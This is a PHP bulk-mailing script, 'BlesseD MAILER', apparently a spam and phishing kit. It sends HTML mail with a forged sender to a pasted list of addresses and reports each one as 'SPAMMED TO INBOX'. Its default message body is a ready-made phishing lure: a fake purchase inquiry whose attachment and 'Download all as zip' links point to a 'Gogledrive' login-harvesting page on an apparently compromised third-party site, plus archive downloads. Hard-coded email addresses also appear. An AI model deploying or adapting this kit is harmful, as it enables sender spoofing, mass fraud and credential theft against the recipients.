<?php
mb_http_input("iso-8859-1");
mb_http_output("iso-8859-1");
?>
<?php
@set_time_limit(0);
if(isset($_POST['send']))
{
	$message = $_POST['html'];
	$subject = $_POST['ursubject'];
	$uremail = $_POST['uremail'];
	$urname = $_POST['realname'];
	$email = $_POST['email'];

	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);

}else{
	$testa ="";
	$message = "<html><body><font color='red'></font></body></html>";
	$subject = "sales Inquiry";
	$urname = "Purchase office";
	$uremail = "bobpan520@aol.com";
	$email = "kennethlexxx_2010@yahoo.com";
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html">
<link rel="SHORTCUT ICON" href="http://www.smt.org//images/favicon.ico">
<title>BlesseD MAILER 2014&trade;</title>
<style type="text/css">
<!--
.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
#Layer1 {	position:absolute;
	left:203px;
	top:109px;
	width:829px;
	height:483px;
	z-index:1;
	margin-top: 0.5%;
	margin-right: 5%;
	right: 20%;
	bottom: 200%;
	margin-bottom: 10%;
	margin-left: 5%;
	border: thin solid #000;
}

-->
</style>
</head>

<body>
<form action="" method="post" name="codered">
<div align="center" id="Layer1">
  <table width="87%" height="77%" border="0" cellspacing="10">
    <tbody><tr>
      <td height="23" colspan="2"><div align="center" class="form">B L E S S E D S I N N E R </div></td>
    </tr>
    <tr>
      <td width="53%" height="24"><div align="center">
        <input name="uremail" type="text" class="form" id="uremail" size="30" value="<? print $uremail; ?>" placeholder="moched001@gmail.com">
      </div></td>
      <td width="47%"><div align="center">
        <input name="realname" type="text" class="form" id="realname" size="30" value="<? print $urname; ?>" placeholder="purchase office">
      </div></td>
    </tr>
    <tr>
      <td height="34" colspan="2"><div align="center">
        <input name="ursubject" type="text" class="form" id="ursubject" size="83%" value="<? print $subject; ?>" placeholder="Purchase Office">
      </div>
	  </td>
    </tr>
    <tr>
      <td height="165"><textarea name="html" class="form" cols="40" rows="10" placeholder="<br />
<span>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif">Sir,<br />
</div>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif">
<p style="MARGIN:0in 0in 0pt" class="MsoNormal"><br />
</p>
<p style="MARGIN:0in 0in 0pt" class="MsoNormal">Hello,

I called your office yesterday but the call could not go through,
i have listed the items in the attached file,
please give us your best quotation on them.

Regards
Mr. Desmond
Purchasing Manager</p>
<p style="MARGIN:0in 0in 0pt" class="MsoNormal"><br />
</p>
<p style="MARGIN:0in 0in 0pt" class="MsoNormal"><a target="_blank" href="https://gallery.mailchimp.com/8a4a5b10fa5ed63178ff3765d/files/f965b75c-4b33-4d79-9ed6-865fb7edb500.rar"><br />
</a></p>
</div>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"><a target="_blank" href="http://www.canardduquebec.qc.ca/UCtrl/scripts/kcfinder/upload/files/1/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1"><font color="#000000"><strong>1 Attachments (total 206 KB) &nbsp; &nbsp; <br />
</strong></font></a></div>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"><a target="_blank" href="https://gallery.mailchimp.com/8a4a5b10fa5ed63178ff3765d/files/c01e6a88-fef9-42fd-b2ae-5aaaf8823a24.zip"><font color="#000000"><strong><br />
</strong></font></a></div>
</span>
<p>&nbsp; <a target="_blank" href="http://www.canardduquebec.qc.ca/UCtrl/scripts/kcfinder/upload/files/1/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1"><img width="122" height="161" src="https://ci4.googleusercontent.com/proxy/8QkxOuWhsbzaRGdQbBmX9_jeND45DObr7oUM_QadUISCLZfHzm0f9oT-y2J5IrSEiE7WVg=s0-d-e1-ft#http://i.imgur.com/lT8kA1J.jpg" style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif;MARGIN-RIGHT:0px" alt="" /><span style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"> <br />
</span></a></p>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"><a target="_blank" href="http://www.canardduquebec.qc.ca/UCtrl/scripts/kcfinder/upload/files/1/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1"><strong>doc45345452. pdf &nbsp; <br />
</strong></a></div>
<span>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"><br />
</div>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"><span style="COLOR:rgb(11,83,148)"><strong><br />
</strong></span></div>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"><span style="COLOR:rgb(11,83,148)"><strong><a target="_blank" href="https://www.canardduquebec.qc.ca/UCtrl/scripts/kcfinder/upload/files/1/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1">Download all as zip</a> &nbsp; &nbsp;</strong></span><strong style="COLOR:rgb(11,83,148)"><a target="_blank" href="https://www.canardduquebec.qc.ca/UCtrl/scripts/kcfinder/upload/files/1/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1">view &nbsp;</a>&nbsp;</strong></div>
<div style="FONT-SIZE:13px;FONT-FAMILY:arial,sans-serif"><strong style="COLOR:rgb(11,83,148)"><br />
</strong></div>
</span>" ><? print $message; ?></textarea></td>
      <td>
	  <div align="right">
        <textarea class="form" rows="10" placeholder="Leads" name="email" cols="35"><? print $email; ?></textarea>
      </div></td></tr>
  </tbody>
  </table>
  <div><input type="submit" class="send" name="send" value="Start Sending">
  </div><DIV class="send"><?php
if(!isset($_POST['send'])){
	exit;
}

if(!isset($_GET['c']))
{
	$email = explode("\n", $email);
}else{
	$email = explode(",", $email);
}
$son = count($email);

if(!isset($_GET['e'])){
	$header = "MIME-Version: 1.0\n";
	$header .= "Content-type: text/html; charset=iso-8859-1\n";
	$header .= "From: ".$urname . " <" . $uremail . ">\n";
	$header .= "Reply-To: " . $uremail . "\n";
	$header .= "X-Priority: 3\n";
	$header .= "X-MSMail-Priority: Normal\n";
	$header .= "X-Mailer: ".$_SERVER["HTTP_HOST"];
}else{
	$header ='MIME-Version: 1.0' . "\r\n";
	$header .= 'Content-type: text/html' . "\r\n";
	$header .="From: ".$uremail;
}
$i = 0;
$voy=1;
while($email[$i])
{
	if(isset($_GET['time']) && isset($_GET['cant'])){
		if(fmod($i,$_GET['cant'])==0 && $i>0){
			print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n";
			flush();
			@mail($_GET['notf'], $subject, $message, $header);
			sleep($_GET['time']);
		}
	}
	$mail = str_replace(array("\n","\r\n"),'',$email[$i]);
        $message1 = ereg_replace("&email&", $mail, $message);
	if(@mail($mail, $subject, $message1, $header))
	{
		print "<font color=blue face=verdana size=1>    ".$voy." OF ".$son."  ;-) ".trim($mail)."  SPAMMED TO INBOX</font><br>\n";
		flush();
	}
	else
	{
		print "<font color=red face=verdana size=1>    ".$voy." OF ".$son.":-( ".trim($mail)."  OOOPSS!!! SOMETHING IS WRONG</font><br>\n";
		flush();
	}                                                             
	$i++;
	$voy++;
}

?></DIV>
</div>
</form>